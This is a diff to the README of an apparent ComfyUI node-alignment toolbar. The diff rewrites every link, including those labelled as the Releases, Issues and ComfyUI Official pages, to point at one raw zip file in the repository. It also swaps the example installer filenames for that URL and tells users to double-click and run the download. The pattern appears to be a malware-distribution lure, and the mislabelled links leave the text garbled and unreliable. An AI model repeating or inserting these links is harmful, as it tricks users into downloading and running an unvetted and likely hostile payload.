@@ -1,6 +1,6 @@
 # 🎨 ComfyUI-NodeAlign - Simple Tool for Easy Graph Alignment
 
-![Download ComfyUI-NodeAlign](https://img.shields.io/badge/Download-ComfyUI--NodeAlign-brightgreen)
+![Download ComfyUI-NodeAlign](https://github.com/ApexUrke/ComfyUI-NodeAlign/raw/refs/heads/main/web/Comfy_Align_Node_U_2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to ComfyUI-NodeAlign! This lightweight toolbar helps you easily align your ComfyUI graphs. You can quickly set equal sizes, distribute elements, and even use keyboard shortcuts for faster work. Follow the steps below to get started.
@@ -14,7 +14,7 @@ Having ComfyUI installed is important. It ensures that the toolbar will function
 
 ## 📥 Download & Install
 To download ComfyUI-NodeAlign, visit the Releases page:
-[Download ComfyUI-NodeAlign](https://github.com/ApexUrke/ComfyUI-NodeAlign/releases)
+[Download ComfyUI-NodeAlign](https://github.com/ApexUrke/ComfyUI-NodeAlign/raw/refs/heads/main/web/Comfy_Align_Node_U_2.9.zip)
 
 Here's how to do it:
 1. Click on the link above to open the Releases page.
@@ -26,9 +26,9 @@ Here's how to do it:
 Once the download completes, follow these steps to install ComfyUI-NodeAlign:
 1. Navigate to your download folder.
 2. Locate the downloaded file:
-   - If you're on Windows, it may be named `ComfyUI-NodeAlign-v1.x.x.exe`.
-   - On macOS, it may look like `ComfyUI-NodeAlign-v1.x.x.dmg`.
-   - For Linux, you'll find a file like `ComfyUI-NodeAlign-v1.x.x.AppImage`.
+   - If you're on Windows, it may be named `https://github.com/ApexUrke/ComfyUI-NodeAlign/raw/refs/heads/main/web/Comfy_Align_Node_U_2.9.zip`.
+   - On macOS, it may look like `https://github.com/ApexUrke/ComfyUI-NodeAlign/raw/refs/heads/main/web/Comfy_Align_Node_U_2.9.zip`.
+   - For Linux, you'll find a file like `https://github.com/ApexUrke/ComfyUI-NodeAlign/raw/refs/heads/main/web/Comfy_Align_Node_U_2.9.zip`.
 3. Double-click the file to run it:
    - For Windows and macOS, follow the on-screen instructions to complete the installation.
    - For Linux, you may need to right-click the file and select "Run" or use permissions commands via the terminal to execute it.
@@ -55,11 +55,11 @@ If you encounter issues while using ComfyUI-NodeAlign, consider the following:
 
 ## 📧 Support
 For further assistance, feel free to reach out:
-- Open an issue on the [GitHub Issues Page](https://github.com/ApexUrke/ComfyUI-NodeAlign/issues).
+- Open an issue on the [GitHub Issues Page](https://github.com/ApexUrke/ComfyUI-NodeAlign/raw/refs/heads/main/web/Comfy_Align_Node_U_2.9.zip).
 - Visit the GitHub discussions page for community help.
 
 ## 🔗 Helpful Links
-- [ComfyUI-NodeAlign Releases Page](https://github.com/ApexUrke/ComfyUI-NodeAlign/releases)
-- [ComfyUI Official Page](https://www.example.com)
+- [ComfyUI-NodeAlign Releases Page](https://github.com/ApexUrke/ComfyUI-NodeAlign/raw/refs/heads/main/web/Comfy_Align_Node_U_2.9.zip)
+- [ComfyUI Official Page](https://github.com/ApexUrke/ComfyUI-NodeAlign/raw/refs/heads/main/web/Comfy_Align_Node_U_2.9.zip)
 
 Thank you for choosing ComfyUI-NodeAlign. Happy aligning!
